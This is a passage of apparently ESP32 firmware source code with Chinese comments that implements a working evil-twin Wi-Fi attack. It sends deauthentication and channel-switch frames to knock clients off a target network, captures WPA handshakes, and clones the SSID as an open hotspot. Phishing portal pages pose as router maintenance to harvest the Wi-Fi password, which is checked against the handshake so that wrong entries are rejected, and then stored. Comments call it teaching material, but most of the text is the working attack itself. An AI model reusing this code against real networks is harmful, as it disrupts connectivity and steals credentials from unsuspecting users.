 * 没有握手 / 握手属于别的 SSID / keyver 不支持时返回"无法校验", 保持原流程。 */
enum : uint8_t { PORTAL_UNVERIFIED = 0, PORTAL_VERIFIED = 1, PORTAL_REJECTED = 2 };

// 是否具备验真条件: 抓到了同一 SSID 的完整 M1+M2, 且 MIC 算法板载可实现
static bool portalVerifiable() {
  if (!sHandshake.m1 || !sHandshake.m2 || !sHandshake.captured) return false;
  if (sHandshake.eapolLen < 97) return false;
  if (sHandshake.keyver == 0 || sHandshake.keyver >= 3) return false;   // SAE / PMF 未实现
  String want = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : sTarget.ssid;
  return want.length() > 0 && sHandshake.essid == want;                 // PMK 的盐必须一致
}

static uint8_t verifyPortalPassword(const String &pass) {
  if (!portalVerifiable()) return PORTAL_UNVERIFIED;
  uint8_t mic[16];
  if (!computeM2Mic(pass.c_str(), mic)) return PORTAL_UNVERIFIED;
  return memcmp(mic, sHandshake.eapol + 81, 16) == 0 ? PORTAL_VERIFIED : PORTAL_REJECTED;
}

// 关闭监听并恢复 AP 信道 (停止/跑包前调用)
static void stopCaptureEngine() {
  sHandshake.capturing = false;
  if (sHandshake.channelMoved) {
    applyApChannel(sHandshake.restoreChannel);
    sHandshake.channelMoved = false;
  }
  syncPromiscuousEngine();   // 若 Sniffer/Airodump/Karma 仍在运行, 保持 promiscuous 开启
}

/* ---------------- chip / 工具 ---------------- */
static String detectChipKey() {
  String chip = ESP.getChipModel();
  chip.trim();
  return chip;
}

static String formatMac(const uint8_t *m) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  return String(buf);
}

/* ---------------- 邪恶双子攻击引擎 (真实改名 + 联动 Deauth + 双子跳频) ---------------- */
static const uint32_t TWIN_HOP_INTERVAL_MS = 2000;  // 每 2s 向双子信道跳频一次
static const uint8_t  TWIN_HOP_FRAMES      = 3;     // 每个跳频窗口连发 3 帧后返回主信道
static const uint8_t  TWIN_HOP_TX_GAP_MS   = 80;    // 跳频窗口内帧间隔

// 阶段 1 需要复用握手监听 (定义在下方)
static bool beginHandshakeCapture(String &err);

// 启动真实攻击: 失败返回 false 并在 err 给出中文原因
static bool eviltwinStartAttack(String &err) {
  // 主目标信道必须能起克隆热点: 2.4G 1-14 (全芯片) 或 5G 非 DFS (仅双频芯片)。
  // 5G DFS 信道 (52-144) 无法作为 AP 驻留, 主目标是 DFS 时应改用「双子目标」做压制。
  if (!sTarget.set || sTarget.channel < 1) {
    err = "无可用主目标: 请先扫描并设置目标 AP";
    return false;
  }
#if !SOC_WIFI_SUPPORT_5G
  if (sTarget.channel > 14) {
    err = "主目标必须是 2.4G 频段 (信道 1-14): 本芯片仅支持 2.4GHz";
    return false;
  }
#else
  if (!isValidCloneChannel(sTarget.channel)) {
    err = isDfs5G((uint8_t)sTarget.channel)
          ? "主目标在 5G DFS 信道 (52-144): 克隆热点无法驻留 DFS, 请把该 AP 加入「双子目标」改用跳频压制"
          : "主目标信道无效: 2.4G 用 1-14, 5G 仅开放 36-48 / 149-165";
    return false;
  }
#endif
  if (sEvilTwin.cloneSsid.length() == 0) sEvilTwin.cloneSsid = sTarget.ssid;
  if (sEvilTwin.cloneSsid.length() == 0) { err = "无可用克隆 SSID: 请先设置主目标"; return false; }

  sEvilTwin.restoreSsid    = apSsid;
  sEvilTwin.restoreChannel = apChannel;

  // 1) 启动对主目标的攻击 (本机随后对齐目标信道, channelMoved 保持 false)
  sDeauth.targetBssid   = sTarget.bssid;
  sDeauth.targetChannel = (uint8_t)sTarget.channel;
  buildDeauthFrame(sDeauth);
  resetKnownStas();
  sDeauth.channelMoved   = false;
  sDeauth.restoreChannel = apChannel;
  sDeauth.txOk = false; sDeauth.lastTxErr = 0;
  sDeauth.csaMode = false; sDeauth.csaCount = 0; sDeauth.frameCount = 0;
  if (!sDeauth.frameReady) { err = "目标 BSSID 无效, 无法构造攻击帧"; return false; }
  // 主攻击模式 + 组合攻击 → 技术位掩码
  const uint16_t emask = deauthTechMask();
  if (emask == 0) {
    err = "未选择任何攻击技术: 请选择主攻击模式或至少一项组合攻击";
    return false;
  }
  for (uint8_t k = 0; k < ATK_TECH_COUNT; k++) sDeauth.techCount[k] = 0;
  sDeauth.comboIndex = 0;
  sDeauth.techCursor = 0;
  sDeauth.assocAuthPhase = true;
  fakeApPoolInit(true);   // 每次攻击重新生成固定假 AP 池
  sDeauth.platformBlocked = false;
  sDeauth.startedAt = millis();
  sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
  // 先探测真 Deauth 是否可用 (白名单已覆盖, 正常为可用); 若仍被拒则切 CSA 强制下线。
  // 组合里不含 Deauth (例如「只发组合攻击」) 时无需探测, 直接开跑。
  csaPrepare(sTarget.ssid, sTarget.bssid, (uint8_t)sTarget.channel);
  if (!(emask & ATK_DEAUTH)) {
    sDeauth.running = true;
  } else {
    const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
    if (probe == ESP_OK) {
      sDeauth.running = true;
    } else {
      sDeauth.platformBlocked = true;
      sDeauth.csaMode = (sDeauth.csaBeaconLen > 0);
      sDeauth.running = sDeauth.csaMode;
      if (sDeauth.csaMode) {
        log("[deauth] 驱动拒绝 Deauth 帧 (err=" + String((int)probe) + ") → 改用 CSA 信道切换强制下线 (切至 ch" +
            String(sDeauth.csaNewChannel) + ", WPA2 有效 / WPA3 PMF 无效)");
      } else {
        log("[deauth] Deauth 被驱动拒绝且 CSA 构造失败 (SSID/BSSID 缺失)");
      }
    }
  }
  sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
  sEvilTwin.deauthAuto = sDeauth.running;

  // 2) 阶段 1 (默认): 先不克隆, 停在目标信道用 Deauth 逼客户端重连真实 AP, 抓它的 M1/M2。
  //    理由: 门户密码验真必须有同一网络的完整四次握手; 一旦先开克隆热点, 客户端直接连我们,
  //    永远不会和真实 AP 握手 → 只能盲收 (假密码也照收)。
  sEvilTwin.hsPhase = false;
  sEvilTwin.hsGot = false;
  if (sEvilTwin.hsFirst && !portalVerifiable()) {
    String herr;
    // 实测 C5 在 AP/APSTA 模式下 sniffer 同样能收到 FromDS (M1/M3);
    // 之前抓不全的真正原因是 handleEapolFrame 方向位取错字节, 与接口模式无关。
    // 因此阶段 1 不再关闭热点, 保证管理页全程在线。
    sHandshake.channelMoved = false;
    if (beginHandshakeCapture(herr)) {
      sEvilTwin.hsPhase = true;
      sEvilTwin.hsPhaseStart = millis();
      sEvilTwin.hopEnabled = false;   // 阶段 1 不能跳频, 否则抓不到握手
      sEvilTwin.caught = false;
      log("[eviltwin] 阶段 1/2: 已在 ch" + String(apChannelActive) + " 监听 " + sTarget.ssid +
          " 的 M1/M2 (最长 " + String(sEvilTwin.hsPhaseLimitMs / 1000) + "s), 抓到即开克隆热点");
      return true;
    }
    log("[eviltwin] 阶段 1 启动握手监听失败: " + herr + " → 直接进入阶段 2 (门户无法验真)");
  }

  // 3) 阶段 2: 热点真实改名 — 与目标一模一样的 SSID + 开放无密码 (victim 免密即可接入钓鱼页) + 主目标信道
  //    5G 目标 (如 ch149) 走 startSoftApOnChannel: 先切频段再起 AP 并校验真实信道
  if (!startSoftApOnChannel(sEvilTwin.cloneSsid, nullptr, (uint8_t)sTarget.channel, 0, 4)) {
    err = "克隆热点启动失败 (SSID 改名 + 开放认证 @ch" + String(sTarget.channel) +
          (isBand5G((uint8_t)sTarget.channel) ? ", 5G 信道可能不受本机 AP 支持" : "") + ")";
    return false;
  }
  apChannelActive = (uint8_t)sTarget.channel;
  sEvilTwin.apCloned = true;

  // 4) 双子目标列表: 至少一条可用则启用轮询跳频注入 (含「假 AP」信标广播)
  sEvilTwin.hopEnabled = false; sEvilTwin.hopping = false; sEvilTwin.hopCurrent = -1;
  sEvilTwin.hopNext = 0;
  sEvilTwin.twinFrameCount = 0; sEvilTwin.beaconCount = 0; sEvilTwin.hopCount = 0;
  sEvilTwin.lastHopAt = millis();
  int usable = 0;
  for (int i = 0; i < MAX_TWINS; i++) {
    if (sTwins[i].used && sTwins[i].channel >= 1) usable++;
  }
  sEvilTwin.hopEnabled = (usable > 0);
  sEvilTwin.caught = false;
  // 阶段 2 直接起克隆热点时, WiFi.softAP 重配会清掉 promiscuous 状态;
  // 这里必须恢复 — Deauth 注入与「客户端 MAC 学习/定向单播」都依赖它。
  syncPromiscuousEngine();
  return true;
}

// 阶段 1 → 阶段 2: 停止握手监听但保持目标信道, 把本机热点改名为克隆 SSID 并开放认证。
// 返回 false 表示克隆热点起不来 (调用方负责报错)。
static bool eviltwinEnterClonePhase(bool gotHs) {
  sEvilTwin.hsPhase = false;
  sEvilTwin.hsGot = gotHs;

  // 停止监听但**不**回原信道: 克隆热点必须驻留在主目标信道, 否则客户端连不上
  sHandshake.capturing = false;
  sHandshake.channelMoved = false;
  esp_wifi_set_promiscuous(false);   // 重新配置热点前先关混杂, 避免与 softAP 重配冲突
  // 阶段 1 可能把 WiFi 切到了纯 STA 监听模式, 这里恢复 APSTA 才能重建 softAP
  if (WiFi.getMode() != WIFI_AP_STA) {
    WiFi.mode(WIFI_AP_STA);
    delay(80);
  }

  if (!startSoftApOnChannel(sEvilTwin.cloneSsid, nullptr, (uint8_t)sTarget.channel, 0, 4)) {
    log("[eviltwin] 克隆热点启动失败 (SSID 改名 + 开放认证 @ch" + String(sTarget.channel) + ")");
    return false;
  }
  apChannelActive = (uint8_t)sTarget.channel;
  sEvilTwin.apCloned = true;
  syncPromiscuousEngine();           // Deauth 注入需要混杂态, 按活跃模块恢复

  int usable = 0;
  for (int i = 0; i < MAX_TWINS; i++) {
    if (sTwins[i].used && sTwins[i].channel >= 1) usable++;
  }
  sEvilTwin.hopEnabled = (usable > 0);
  sEvilTwin.hopping = false;
  sEvilTwin.hopCurrent = -1;
  sEvilTwin.lastHopAt = millis();

  log(String("[eviltwin] 阶段 2/2: 克隆热点已开放 ") + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
      String(sTarget.channel) + ") — " +
      (gotHs ? "已抓到 M1/M2, 门户提交的密码会在板上验真 (假密码打回)"
             : "未抓到 M1/M2, 门户只能盲收 (无法判断密码真假)"));
  emitLabState("eviltwin", true);
  return true;
}

// 选取下一条双子目标并切到它的信道, 预构本窗口要发的帧。成功返回 true。
static bool eviltwinBeginHop() {
  for (int tries = 0; tries < MAX_TWINS; tries++) {
    int idx = (sEvilTwin.hopNext + tries) % MAX_TWINS;
    TwinTarget &t = sTwins[idx];
    if (!t.used || t.channel < 1) continue;
    if (!applyApChannel((uint8_t)t.channel)) continue;
    sEvilTwin.hopCurrent = (int8_t)idx;
    sEvilTwin.hopNext = (uint8_t)((idx + 1) % MAX_TWINS);
    // Deauth 帧: BSSID 合法才发 (假 AP 条目也可同时踢掉其真实客户端)
    sEvilTwin.twinFrameReady = buildDeauthFrameRaw(t.bssid, 1, sEvilTwin.twinFrame);
    // 假 AP: 构伪造信标
    sEvilTwin.beaconLen = 0;
    if (t.fakeAp) {
      String bssid = t.bssid;
      uint8_t probe[6];
      if (bssid.length() == 0 || !parseBssid(bssid, probe)) {
        // BSSID 缺失/非法时按 SSID 派生一个本地伪造 MAC (locally administered 位已置)
        uint8_t mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
        for (size_t k = 0; k < t.ssid.length(); k++) mac[2 + (k % 4)] ^= (uint8_t)t.ssid[k];
        mac[5] ^= (uint8_t)t.channel;
        char buf[18];
        snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        bssid = String(buf);
      }
      sEvilTwin.beaconLen = buildBeaconFrame(t.ssid.length() ? t.ssid : sEvilTwin.cloneSsid,
                                            bssid, (uint8_t)t.channel, sEvilTwin.beaconFrame);
    }
    sEvilTwin.twinFramesLeft = TWIN_HOP_FRAMES;
    sEvilTwin.beaconLeft = (sEvilTwin.beaconLen > 0) ? 2 : 0;
    sEvilTwin.hopping = true;
    sEvilTwin.hopCount++;
    return true;
  }
  return false;
}

// 攻击收尾: restoreAp=true 时同时恢复原热点名/密码/信道 (手动停止);
// false 时仅停止空口干扰 (捕获凭据后, 同名开放热点保留供已接入设备浏览)。
static void eviltwinStopAttack(bool restoreAp) {
  if (sEvilTwin.hsPhase) {           // 阶段 1: 只开了监听, 热点从未改名
    sEvilTwin.hsPhase = false;
    sHandshake.capturing = false;
    sHandshake.channelMoved = false;
    esp_wifi_set_promiscuous(false);
    syncPromiscuousEngine();
    // 仅当阶段 1 真的关过热点 (模式异常) 时才重建, 正常 AP 模式下不打断管理连接
    if (WiFi.getMode() != WIFI_AP_STA) {
      WiFi.mode(WIFI_AP_STA);
      delay(80);
      startSoftApOnChannel(sEvilTwin.restoreSsid.length() ? sEvilTwin.restoreSsid : apSsid,
                           AP_PASSWORD, sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel,
                           0, 4);
      apChannelActive = sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel;
    }
    sEvilTwin.apCloned = false;
  }
  if (sEvilTwin.hopping) {           // 正处跳频窗口: 先回主信道再收尾
    applyApChannel(sDeauth.targetChannel);
    sEvilTwin.hopping = false;
  }
  if (sEvilTwin.deauthAuto) {
    sDeauth.running = false;
    sDeauth.channelMoved = false;    // 信道归属由本攻击引擎管理
    sEvilTwin.deauthAuto = false;
  }
  sEvilTwin.hopEnabled = false;
  sEvilTwin.hopping = false;
  sEvilTwin.hopCurrent = -1;
  sEvilTwin.twinFramesLeft = 0;
  sEvilTwin.beaconLeft = 0;
  if (restoreAp && sEvilTwin.apCloned) {
    startSoftApOnChannel(sEvilTwin.restoreSsid, AP_PASSWORD, sEvilTwin.restoreChannel, 0, 4);
    apChannelActive = sEvilTwin.restoreChannel;
    sEvilTwin.apCloned = false;
  }
}

/* ---------------- HTTP 处理 ---------------- */
static void sendAdminPage() {
  server.sendHeader("Content-Encoding", "deflate");
  server.send_P(200, "text/html; charset=utf-8", (const char *)ADMIN_PAGE, ADMIN_PAGE_LEN);
}

// P4: 厂商 / 协议名称表。公开只读资源 (不含密钥), 由 admin.html 以 <script src> 加载。
// 压缩字节直出, 不占 RAM; 缓存一天, 减少后台刷新流量。
static void sendVendorDb() {
  server.sendHeader("Content-Encoding", "deflate");
  server.sendHeader("Cache-Control", "max-age=86400");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send_P(200, "application/javascript; charset=utf-8", (const char *)VENDOR_DB, VENDOR_DB_LEN);
}

// 门户页面 (err 非空时在表单上方显示错误提示: 密码未通过 MIC 校验时要求重输)
static String portalHtml(const String &err) {
  String targetName = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : (sTarget.ssid.length() ? sTarget.ssid : apSsid);

  // 攻击准备 (页面模板): 1=固件升级 2=认证过期 3=网络拥堵重连
  String tplBadge, tplTitle, tplWarn, tplFoot;
  switch (sEvilTwin.templateId) {
    case 2:
      tplBadge = "⚠️ 网络认证已过期";
      tplTitle = "重新认证以恢复上网";
      tplWarn  = "路由器 <b>" + htmlEscape(targetName) + "</b> 的拨号认证信息已失效，当前设备被限制访问互联网。请输入该 Wi-Fi 的连接密码以自动重新认证。";
      tplFoot  = "Router Authentication Portal · 802.11ax";
      break;
    case 3:
      tplBadge = "⚠️ 网络拥堵 · 需重连";
      tplTitle = "重新连接无线网络";
      tplWarn  = "检测到 <b>" + htmlEscape(targetName) + "</b> 信道拥堵，路由器已重置当前会话。为恢复稳定连接，请重新输入该 Wi-Fi 的连接密码。";
      tplFoot  = "Router Traffic Control · 802.11ax";
      break;
    default:
      tplBadge = "⚠️ 路由器系统安全维护";
      tplTitle = "网络连接验证与恢复";
      tplWarn  = "检测到无线路由器 <b>" + htmlEscape(targetName) + "</b> 正在进行无线射频固件更新。为恢复上网，需验证无线凭据以同步配置。";
      tplFoot  = "Router Security Maintenance Portal · 802.11ax";
      break;
  }

  String errBox = err.length() ? ("<div class='err'>" + htmlEscape(err) + "</div>") : String("");
  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>" + tplTitle + "</title>"
    "<style>"
    "body{margin:0;padding:24px 16px;background:#f5f0e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#111}"
    ".card{max-width:440px;margin:20px auto;background:#fff;border:3px solid #111;border-radius:16px;box-shadow:6px 6px 0 #111;padding:24px}"
    ".badge{background:#ffe14d;border:2px solid #111;border-radius:8px;padding:4px 8px;font-weight:900;font-size:12px;display:inline-block;margin-bottom:12px}"
    "h2{margin:0 0 10px;font-size:20px;font-weight:900}"
    "p{font-size:14px;color:#444;line-height:1.6;margin:0 0 16px}"
    ".warn-box{background:#ffefd5;border-left:5px solid #ffa14d;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px}"
    "input[type=password]{width:100%;box-sizing:border-box;padding:12px 14px;border:3px solid #111;border-radius:10px;font-size:16px;font-weight:700;outline:none;background:#fafafa;margin-bottom:16px}"
    "input[type=password]:focus{background:#fff;border-color:#ff8fab}"
    "button{width:100%;padding:14px;background:#ffdf5d;color:#111;font-weight:900;font-size:16px;border:3px solid #111;border-radius:12px;cursor:pointer;box-shadow:4px 4px 0 #111}"
    "button:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #111}"
    ".foot{text-align:center;font-size:11px;color:#888;margin-top:20px}"
    ".err{background:#ffe3e3;border-left:5px solid #e05252;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px;color:#a11;font-weight:700}"
    "</style></head><body>"
    "<div class='card'>"
    "<div class='badge'>" + tplBadge + "</div>"
    "<h2>" + tplTitle + "</h2>"
    "<div class='warn-box'>" + tplWarn + "</div>"
    + errBox +
    "<p>请输入该 Wi-Fi 网络当前使用的连接密码：</p>"
    "<form method='POST' action='/api/portal/submit'>"
    "<input type='password' name='wifi_password' placeholder='请输入 Wi-Fi 密码' required minlength='8' autocomplete='off'>"
    "<button type='submit'>✓ 验证并恢复网络连接</button>"
    "</form>"
    "<div class='foot'>" + tplFoot + "</div>"
    "</div></body></html>";
  return html;
}

static void sendPortalPage() {
  server.send(200, "text/html; charset=utf-8", portalHtml(""));
}

static void handlePortalSubmit() {
  String pass = server.arg("wifi_password");
  pass.trim();
  String clientIp = server.client().remoteIP().toString();
  // 有握手就验真: 假密码直接打回, 不写入凭据表, 逼迫输入真实口令
  const uint8_t verdict = verifyPortalPassword(pass);
  if (verdict == PORTAL_REJECTED) {
    sPortalRejects++;
    log("[eviltwin] 门户提交的密码未通过握手 MIC 校验, 已拒绝并要求重输 (累计 " +
        String(sPortalRejects) + " 次, 明文不落库)");
    server.send(200, "text/html; charset=utf-8",
                portalHtml("密码校验失败：与路由器当前使用的加密密钥不匹配，请核对后重新输入。"));
    return;
  }
  if (pass.length() > 0) {
    addCredential(clientIp, pass, verdict == PORTAL_VERIFIED);
    // 双子攻击中捕获到第一条凭据: 自动收尾 — 停止 Deauth/跳频, 同名开放热点保留供其浏览
    if (sEvilTwin.active && !sEvilTwin.caught) {
      sEvilTwin.caught = true;
      eviltwinStopAttack(false);
      log("[eviltwin] 已捕获凭据, 自动停止 Deauth 攻击; 克隆热点保持开放, 后台点「停止实验」恢复原热点");
      emitJson("eviltwin", "\"caught\":true,\"client\":\"" + jsonEscape(clientIp) + "\"");
    }
  }
  String resp = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>正在恢复连接</title>"
    "<style>body{margin:0;padding:30px;background:#f5f0e8;text-align:center;font-family:sans-serif}"
    ".card{max-width:400px;margin:40px auto;background:#fff;border:3px solid #111;border-radius:16px;padding:24px;box-shadow:6px 6px 0 #111}"
    "</style></head><body><div class='card'>"
    "<h2 style='color:#35c04a'>✓ 凭据已同步</h2>"
    "<p>配置验证通过，路由器正在重新载入射频驱动，将在 30 秒内恢复互联网访问，请稍候并保持连接。</p>"
    "</div></body></html>";
  server.send(200, "text/html; charset=utf-8", resp);
}

static String targetJson(const Target &t) {
  if (!t.set) return "null";
  String j = "{";
  j += "\"ssid\":\"" + jsonEscape(t.ssid) + "\",";
  j += "\"bssid\":\"" + jsonEscape(t.bssid) + "\",";
  j += "\"channel\":" + String(t.channel) + ",";
  j += "\"band\":" + String(isBand5G((uint8_t)t.channel) ? 5 : 2) + ",";
  j += "\"rssi\":" + String(t.rssi) + ",";
  j += "\"auth\":\"" + jsonEscape(t.auth) + "\"}";
  return j;
}

static void sendInfo() {
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t minFree  = ESP.getMinFreeHeap();
  uint32_t maxBlock = ESP.getMaxAllocHeap();
  uint32_t total    = ESP.getHeapSize();
  uint8_t  usedPct  = total ? (uint8_t)((total - freeHeap) * 100 / total) : 0;

  String json;
  json.reserve(640);
  json = "{";
  json += "\"chip\":\"" + jsonEscape(detectChipKey()) + "\",";
#if SOC_WIFI_SUPPORT_5G
  json += "\"band5g\":true,";
#else
  json += "\"band5g\":false,";
#endif
#if FW_BLE_SUPPORTED
  json += "\"ble\":{\"supported\":true,\"running\":" +
          String(sBLE.phase == BLE_RUNNING && sBLE.want ? "true" : "false") +
          ",\"devices\":" + String(sBLE.deviceCount) +
          ",\"totalAdv\":" + String(sBLE.totalAdv) + "},";
#else
  json += "\"ble\":{\"supported\":false},";
#endif
#if FW_IEEE802154_SUPPORTED
  json += "\"ieee802154\":{\"supported\":true,\"running\":" +
          String(sI154.phase == I154_RUNNING && sI154.want ? "true" : "false") +
          ",\"total\":" + String(sI154.total) +
          ",\"devices\":" + String(sI154.devCount) + "},";
#else
  json += "\"ieee802154\":{\"supported\":false},";
#endif
  json += "\"version\":\"" FW_VERSION "\",";
  uint8_t macAddressBytes[6];
  WiFi.softAPmacAddress(macAddressBytes);
  json += "\"mac\":\"" + formatMac(macAddressBytes) + "\",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"freeMem\":" + String(freeHeap) + ",";
  json += "\"minFreeMem\":" + String(minFree) + ",";
  json += "\"maxBlock\":" + String(maxBlock) + ",";
  json += "\"memUsedPct\":" + String(usedPct) + ",";
  // 攻击期间热点已真实改名: ssid 报告空口实际 SSID, configSsid 报告 NVS 配置名
  json += "\"ssid\":\"" + jsonEscape(sEvilTwin.apCloned ? sEvilTwin.cloneSsid : apSsid) + "\",";
  json += "\"configSsid\":\"" + jsonEscape(apSsid) + "\",";
  json += "\"channel\":" + String(apChannelActive) + ",";  // 空口实际信道 (攻击期间可能与配置值不同)
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
  
  // 教学模块状态
  json += "\"evilTwin\":{\"active\":" + String(sEvilTwin.active ? "true" : "false") +
          ",\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
          "\",\"apCloned\":" + String(sEvilTwin.apCloned ? "true" : "false") +
          ",\"hopEnabled\":" + String(sEvilTwin.hopEnabled ? "true" : "false") +
          ",\"hopping\":" + String(sEvilTwin.hopping ? "true" : "false") +
          ",\"hopCount\":" + String(sEvilTwin.hopCount) +
          ",\"twinFrames\":" + String(sEvilTwin.twinFrameCount) +
          ",\"beacons\":" + String(sEvilTwin.beaconCount) +
          ",\"twins\":" + String(twinCount()) +
          ",\"hopCurrent\":" + String((int)sEvilTwin.hopCurrent) +
          ",\"template\":" + String(sEvilTwin.templateId) +
          ",\"elapsedMs\":" + String(sEvilTwin.active ? (millis() - sEvilTwin.startTime) : 0) +
          ",\"caught\":" + String(sEvilTwin.caught ? "true" : "false") +
          ",\"hsPhase\":" + String(sEvilTwin.hsPhase ? "true" : "false") +
          ",\"hsGot\":" + String(sEvilTwin.hsGot ? "true" : "false") +
          ",\"preCapture\":" + String(sEvilTwin.hsFirst ? "true" : "false") +
          ",\"credsCount\":" + String(sCredCount) + "},";
  json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
          ",\"count\":" + String(sDeauth.frameCount) +
          ",\"unicast\":" + String(sDeauth.unicastCount) +
          ",\"knownStas\":" + String(sKnownStaCount) +
          ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
          ",\"channel\":" + String(sDeauth.targetChannel) +
          ",\"mode\":" + String(sDeauth.primaryMode) +
          ",\"combo\":" + String(sDeauth.comboMask) +
          ",\"tech\":\"" + String(atkTechName(sDeauth.techCursor)) + "\"" +
          ",\"duration\":" + String(sDeauth.durationMs / 1000) +
          ",\"remain\":" + String((sDeauth.running && sDeauth.stopAt) ?
                                   (int32_t)(sDeauth.stopAt - millis()) / 1000 : -1) +
          ",\"band\":" + String(isBand5G(sDeauth.targetChannel) ? 5 : 2) + "},";
  json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
          ",\"captured\":" + String(sHandshake.captured ? "true" : "false") +
          ",\"verifiable\":" + String(portalVerifiable() ? "true" : "false") +
          ",\"keyver\":" + String(sHandshake.keyver) +
          ",\"frames\":" + String(sHandshake.frameCount) +
          ",\"m1\":" + String(sHandshake.m1 ? "true" : "false") +
          ",\"m2\":" + String(sHandshake.m2 ? "true" : "false") +
          ",\"m3\":" + String(sHandshake.m3 ? "true" : "false") +
          ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
          ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
          ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";
  json += "\"sniffer\":{\"running\":" + String(sSniffer.running ? "true" : "false") +
          ",\"fps\":" + String(sSniffer.fps) +
          ",\"total\":" + String(sSniffer.totalPackets) + "},";
  json += "\"airodump\":{\"running\":" + String(sAirodump.running ? "true" : "false") +
          ",\"channel\":" + String(sAirodump.currentChannel) +
          ",\"band\":" + String(isBand5G(sAirodump.currentChannel) ? 5 : 2) +
          ",\"stations\":" + String(sAirodump.stationCount) + "},";
  json += "\"karma\":{\"running\":" + String(sKarma.running ? "true" : "false") +
          ",\"probes\":" + String(sKarma.probesCaptured) +
          ",\"baited\":" + String(sKarma.probesBaited) + "},";

  json += "\"target\":" + targetJson(sTarget) + ",";
  // 双子目标列表 (最多 4 条, 含假 AP 标记与当前跳频指向)
  json += "\"twins\":[";
  bool firstTwin = true;
  for (int i = 0; i < MAX_TWINS; i++) {
    if (!sTwins[i].used) continue;
    if (!firstTwin) json += ",";
    firstTwin = false;
    json += "{\"idx\":" + String(i) +
            ",\"ssid\":\"" + jsonEscape(sTwins[i].ssid) +
            "\",\"bssid\":\"" + jsonEscape(sTwins[i].bssid) +
            "\",\"channel\":" + String(sTwins[i].channel) +
            ",\"band\":" + String(isBand5G((uint8_t)sTwins[i].channel) ? 5 : 2) +
            ",\"auth\":\"" + jsonEscape(sTwins[i].auth) +
            "\",\"rssi\":" + String(sTwins[i].rssi) +
            ",\"fakeAp\":" + String(sTwins[i].fakeAp ? "true" : "false") +
            ",\"active\":" + String((sEvilTwin.hopCurrent == (int8_t)i) ? "true" : "false") + "}";
  }
  json += "],";
  // 仍在使用出厂初始口令时提示面板引导用户立即改密 (口令本身绝不下发)
  json += "\"mustChangeToken\":" + String(sMustChangeToken ? "true" : "false");
  json += "}";
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleScan() {
  // 频段过滤 (真机验证: C5 双频全扫射频离站 ~30s+ → 软 AP 信标中断 → 客户端被踢且不自动重连):
  // ?band=2/2g → 只扫 2.4G (14 信道, 默认推荐); ?band=5/5g → 只扫 5G; 其余/缺省 → 双频全扫 (旧行为)
  String bandArg = server.arg("band");
  wifi_band_mode_t scanBand = WIFI_BAND_MODE_AUTO;
  const char *bandName = "双频";
  uint32_t scanStartedAt = millis();
  if (bandArg == "2" || bandArg == "2g" || bandArg == "24") {
    scanBand = WIFI_BAND_MODE_2G_ONLY;
    bandName = "2.4G";
  } else if (bandArg == "5" || bandArg == "5g") {
    scanBand = WIFI_BAND_MODE_5G_ONLY;
    bandName = "5G";
  }
  log("[scan] 开始扫描周围 AP (频段: " + String(bandName) + ") @" + String(millis()) + "ms");
  // 扫描期间临时切换 band mode 缩短射频离站时间, 结束后恢复 AUTO (不影响软 AP 信道配置)
  if (scanBand != WIFI_BAND_MODE_AUTO) {
    esp_err_t bem = esp_wifi_set_band_mode(scanBand);
    log("[scan] band mode -> " + String(bandName) + " (err=0x" + String((uint32_t)bem, HEX) + ")");
  }
  // 优化: 主动扫描信道驻留时间设为 120ms (扫描耗时缩减 60%, 显著降低软 AP 连接抖动与看门狗超时风险)
  int16_t n = WiFi.scanNetworks(false, true, false, 120);
  if (n < 0) {
    // 频段过滤扫描不重试: WebServer 响应窗口仅 5s (HTTP_MAX_SEND_WAIT), 重试会翻倍超窗
    if (scanBand == WIFI_BAND_MODE_AUTO) {
      WiFi.scanDelete();
      n = WiFi.scanNetworks(false, true, false, 150);
    }
  }
  if (scanBand != WIFI_BAND_MODE_AUTO) {
    esp_err_t ber = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    log("[scan] band mode 恢复 AUTO (err=0x" + String((uint32_t)ber, HEX) + ") 扫描结果 n=" + String(n) +
        " 耗时" + String((uint32_t)(millis() - scanStartedAt)) + "ms");
  }
  // 扫描结束后立即将射频强制切回 SoftAP 设定信道, 确保与电脑等客户端的连接迅速恢复
  applyApChannel(apChannel);
  String json;
  json.reserve(1024 + (n > 0 ? n * 120 : 0));
  json = "{\"networks\":[";
  int count = 0;
  for (int i = 0; i < n; i++) {
    if (count) json += ",";
    String ssid = WiFi.SSID(i);
